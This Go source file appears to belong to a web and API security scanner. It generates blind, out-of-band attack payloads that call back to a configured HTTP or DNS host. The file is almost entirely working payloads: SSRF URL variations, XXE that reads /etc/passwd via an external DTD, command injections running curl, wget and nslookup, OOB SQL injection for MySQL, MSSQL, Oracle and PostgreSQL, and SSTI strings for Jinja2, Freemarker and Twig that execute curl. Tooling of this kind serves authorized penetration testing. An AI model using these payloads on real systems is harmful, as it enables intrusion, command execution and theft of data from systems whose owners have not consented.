// Package payloads provides attack payload generation
package payloads

import (
	"fmt"
	"strings"

	"github.com/su1ph3r/indago/pkg/types"
)

// BlindGenerator generates blind/out-of-band attack payloads
type BlindGenerator struct {
	callbackHTTP string
	callbackDNS  string
}

// BlindSettings holds blind attack settings
type BlindSettings struct {
	CallbackHTTP string `yaml:"callback_http" json:"callback_http"`
	CallbackDNS  string `yaml:"callback_dns" json:"callback_dns"`
}

// NewBlindGenerator creates a new blind attack generator
func NewBlindGenerator(settings BlindSettings) *BlindGenerator {
	return &BlindGenerator{
		callbackHTTP: settings.CallbackHTTP,
		callbackDNS:  settings.CallbackDNS,
	}
}

// Type returns the attack type
func (g *BlindGenerator) Type() string {
	return "blind"
}

// SetCallbacks sets the callback URLs
func (g *BlindGenerator) SetCallbacks(httpCallback, dnsCallback string) {
	g.callbackHTTP = httpCallback
	g.callbackDNS = dnsCallback
}

// Generate generates blind attack payloads
func (g *BlindGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	if g.callbackHTTP == "" && g.callbackDNS == "" {
		return payloads
	}

	// Blind SSRF payloads
	payloads = append(payloads, g.generateBlindSSRF(param)...)

	// Blind XXE payloads
	payloads = append(payloads, g.generateBlindXXE(param)...)

	// Blind command injection payloads
	payloads = append(payloads, g.generateBlindCommandInjection(param)...)

	// Blind SQL injection (OOB)
	payloads = append(payloads, g.generateBlindSQLiOOB(param)...)

	// Blind SSTI payloads
	payloads = append(payloads, g.generateBlindSSTI(param)...)

	return payloads
}

// generateBlindSSRF generates blind SSRF payloads
func (g *BlindGenerator) generateBlindSSRF(param *types.Parameter) []Payload {
	var payloads []Payload

	if g.callbackHTTP != "" {
		// Direct HTTP callback
		payloads = append(payloads, Payload{
			Value:       g.callbackHTTP,
			Type:        types.AttackBlindSSRF,
			Category:    "ssrf",
			Description: "Blind SSRF via HTTP callback",
			Metadata: map[string]string{
				"callback_type": "http",
				"target_param":  getParamName(param),
			},
		})

		// With various protocols
		protocols := []string{"http://", "https://", "gopher://", "dict://", "file://"}
		for _, proto := range protocols {
			if strings.HasPrefix(g.callbackHTTP, "http") {
				url := strings.Replace(g.callbackHTTP, "http://", proto, 1)
				url = strings.Replace(url, "https://", proto, 1)
				payloads = append(payloads, Payload{
					Value:       url,
					Type:        types.AttackBlindSSRF,
					Category:    "ssrf",
					Description: fmt.Sprintf("Blind SSRF via %s", proto),
					Metadata: map[string]string{
						"callback_type": "http",
						"protocol":      proto,
						"target_param":  getParamName(param),
					},
				})
			}
		}

		// URL variations
		variations := []string{
			g.callbackHTTP,
			g.callbackHTTP + "?",
			g.callbackHTTP + "#",
			g.callbackHTTP + "@evil.com",
			"http://localhost@" + stripProtocol(g.callbackHTTP),
			"http://127.0.0.1@" + stripProtocol(g.callbackHTTP),
		}

		for _, v := range variations {
			payloads = append(payloads, Payload{
				Value:       v,
				Type:        types.AttackBlindSSRF,
				Category:    "ssrf",
				Description: "Blind SSRF URL variation",
				Metadata: map[string]string{
					"callback_type": "http",
					"target_param":  getParamName(param),
				},
			})
		}
	}

	if g.callbackDNS != "" {
		// DNS-based SSRF
		payloads = append(payloads, Payload{
			Value:       "http://" + g.callbackDNS,
			Type:        types.AttackBlindSSRF,
			Category:    "ssrf",
			Description: "Blind SSRF via DNS callback",
			Metadata: map[string]string{
				"callback_type": "dns",
				"target_param":  getParamName(param),
			},
		})
	}

	return payloads
}

// generateBlindXXE generates blind XXE payloads
func (g *BlindGenerator) generateBlindXXE(param *types.Parameter) []Payload {
	var payloads []Payload

	if g.callbackHTTP != "" {
		// External DTD XXE
		xxePayloads := []string{
			// Basic XXE with external entity
			`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "` + g.callbackHTTP + `">]><foo>&xxe;</foo>`,

			// Parameter entity XXE
			`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "` + g.callbackHTTP + `">%xxe;]><foo>test</foo>`,

			// XXE with file:// to HTTP
			`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "` + g.callbackHTTP + `?file=test">]><foo>&xxe;</foo>`,

			// XXE OOB data exfiltration setup
			`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "` + g.callbackHTTP + `/xxe.dtd">%dtd;]><foo>test</foo>`,
		}

		for _, xxe := range xxePayloads {
			payloads = append(payloads, Payload{
				Value:       xxe,
				Type:        types.AttackBlindXXE,
				Category:    "xxe",
				Description: "Blind XXE with OOB callback",
				Metadata: map[string]string{
					"callback_type": "http",
					"target_param":  getParamName(param),
				},
			})
		}
	}

	if g.callbackDNS != "" {
		// DNS-based XXE
		xxe := `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://` + g.callbackDNS + `">]><foo>&xxe;</foo>`
		payloads = append(payloads, Payload{
			Value:       xxe,
			Type:        types.AttackBlindXXE,
			Category:    "xxe",
			Description: "Blind XXE via DNS callback",
			Metadata: map[string]string{
				"callback_type": "dns",
				"target_param":  getParamName(param),
			},
		})
	}

	return payloads
}

// generateBlindCommandInjection generates blind command injection payloads
func (g *BlindGenerator) generateBlindCommandInjection(param *types.Parameter) []Payload {
	var payloads []Payload

	if g.callbackHTTP != "" {
		// curl-based callbacks
		curlPayloads := []string{
			`; curl ` + g.callbackHTTP + ` ;`,
			`| curl ` + g.callbackHTTP,
			`&& curl ` + g.callbackHTTP,
			`|| curl ` + g.callbackHTTP,
			"`curl " + g.callbackHTTP + "`",
			"$(curl " + g.callbackHTTP + ")",
			`; wget ` + g.callbackHTTP + ` ;`,
			`| wget -q -O- ` + g.callbackHTTP,
		}

		for _, p := range curlPayloads {
			payloads = append(payloads, Payload{
				Value:       p,
				Type:        types.AttackBlindCmdInject,
				Category:    "command_injection",
				Description: "Blind command injection via HTTP callback",
				Metadata: map[string]string{
					"callback_type": "http",
					"target_param":  getParamName(param),
				},
			})
		}
	}

	if g.callbackDNS != "" {
		// DNS-based command injection
		dnsPayloads := []string{
			`; nslookup ` + g.callbackDNS + ` ;`,
			`| nslookup ` + g.callbackDNS,
			`; host ` + g.callbackDNS + ` ;`,
			`; dig ` + g.callbackDNS + ` ;`,
			"`nslookup " + g.callbackDNS + "`",
			"$(nslookup " + g.callbackDNS + ")",
			`; ping -c 1 ` + g.callbackDNS + ` ;`,
		}

		for _, p := range dnsPayloads {
			payloads = append(payloads, Payload{
				Value:       p,
				Type:        types.AttackBlindCmdInject,
				Category:    "command_injection",
				Description: "Blind command injection via DNS callback",
				Metadata: map[string]string{
					"callback_type": "dns",
					"target_param":  getParamName(param),
				},
			})
		}
	}

	return payloads
}

// generateBlindSQLiOOB generates blind SQL injection OOB payloads
func (g *BlindGenerator) generateBlindSQLiOOB(param *types.Parameter) []Payload {
	var payloads []Payload

	if g.callbackDNS != "" {
		// MySQL OOB
		mysqlPayloads := []string{
			`' AND (SELECT LOAD_FILE(CONCAT('\\\\',` + g.callbackDNS + `,'\\share\\a')))--`,
			`' UNION SELECT LOAD_FILE(CONCAT('\\\\',` + g.callbackDNS + `,'\\a'))--`,
		}

		for _, p := range mysqlPayloads {
			payloads = append(payloads, Payload{
				Value:       p,
				Type:        types.AttackSQLi,
				Category:    "sqli",
				Description: "Blind SQLi OOB via DNS (MySQL)",
				Metadata: map[string]string{
					"callback_type": "dns",
					"database":      "mysql",
					"target_param":  getParamName(param),
				},
			})
		}

		// MSSQL OOB
		mssqlPayloads := []string{
			`'; EXEC master..xp_dirtree '\\` + g.callbackDNS + `\share';--`,
			`'; EXEC master..xp_fileexist '\\` + g.callbackDNS + `\share';--`,
		}

		for _, p := range mssqlPayloads {
			payloads = append(payloads, Payload{
				Value:       p,
				Type:        types.AttackSQLi,
				Category:    "sqli",
				Description: "Blind SQLi OOB via DNS (MSSQL)",
				Metadata: map[string]string{
					"callback_type": "dns",
					"database":      "mssql",
					"target_param":  getParamName(param),
				},
			})
		}

		// Oracle OOB
		oraclePayloads := []string{
			`' AND UTL_HTTP.REQUEST('http://` + g.callbackDNS + `')='x'--`,
			`' AND DBMS_LDAP.INIT('` + g.callbackDNS + `',389)='x'--`,
		}

		for _, p := range oraclePayloads {
			payloads = append(payloads, Payload{
				Value:       p,
				Type:        types.AttackSQLi,
				Category:    "sqli",
				Description: "Blind SQLi OOB via DNS (Oracle)",
				Metadata: map[string]string{
					"callback_type": "dns",
					"database":      "oracle",
					"target_param":  getParamName(param),
				},
			})
		}

		// PostgreSQL OOB
		pgPayloads := []string{
			`'; COPY (SELECT '') TO PROGRAM 'nslookup ` + g.callbackDNS + `';--`,
		}

		for _, p := range pgPayloads {
			payloads = append(payloads, Payload{
				Value:       p,
				Type:        types.AttackSQLi,
				Category:    "sqli",
				Description: "Blind SQLi OOB via DNS (PostgreSQL)",
				Metadata: map[string]string{
					"callback_type": "dns",
					"database":      "postgresql",
					"target_param":  getParamName(param),
				},
			})
		}
	}

	return payloads
}

// generateBlindSSTI generates blind SSTI payloads
func (g *BlindGenerator) generateBlindSSTI(param *types.Parameter) []Payload {
	var payloads []Payload

	if g.callbackHTTP == "" && g.callbackDNS == "" {
		return payloads
	}

	callback := g.callbackHTTP
	if callback == "" {
		callback = "http://" + g.callbackDNS
	}

	// Jinja2 (Python)
	jinja2Payloads := []string{
		`{{config.__class__.__init__.__globals__['os'].popen('curl ` + callback + `').read()}}`,
		`{{''.class.__mro__[2].__subclasses__()[40]('curl ` + callback + `',shell=True,stdout=-1).communicate()}}`,
	}

	for _, p := range jinja2Payloads {
		payloads = append(payloads, Payload{
			Value:       p,
			Type:        types.AttackSSTI,
			Category:    "ssti",
			Description: "Blind SSTI (Jinja2) via HTTP callback",
			Metadata: map[string]string{
				"template_engine": "jinja2",
				"callback_type":   "http",
				"target_param":    getParamName(param),
			},
		})
	}

	// Freemarker (Java)
	freemarkerPayloads := []string{
		`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl ` + callback + `")}`,
	}

	for _, p := range freemarkerPayloads {
		payloads = append(payloads, Payload{
			Value:       p,
			Type:        types.AttackSSTI,
			Category:    "ssti",
			Description: "Blind SSTI (Freemarker) via HTTP callback",
			Metadata: map[string]string{
				"template_engine": "freemarker",
				"callback_type":   "http",
				"target_param":    getParamName(param),
			},
		})
	}

	// Twig (PHP)
	twigPayloads := []string{
		`{{['curl ` + callback + `']|filter('system')}}`,
	}

	for _, p := range twigPayloads {
		payloads = append(payloads, Payload{
			Value:       p,
			Type:        types.AttackSSTI,
			Category:    "ssti",
			Description: "Blind SSTI (Twig) via HTTP callback",
			Metadata: map[string]string{
				"template_engine": "twig",
				"callback_type":   "http",
				"target_param":    getParamName(param),
			},
		})
	}

	return payloads
}

// Helper functions

func getParamName(param *types.Parameter) string {
	if param != nil {
		return param.Name
	}
	return ""
}

func stripProtocol(url string) string {
	url = strings.TrimPrefix(url, "http://")
	url = strings.TrimPrefix(url, "https://")
	return url
}
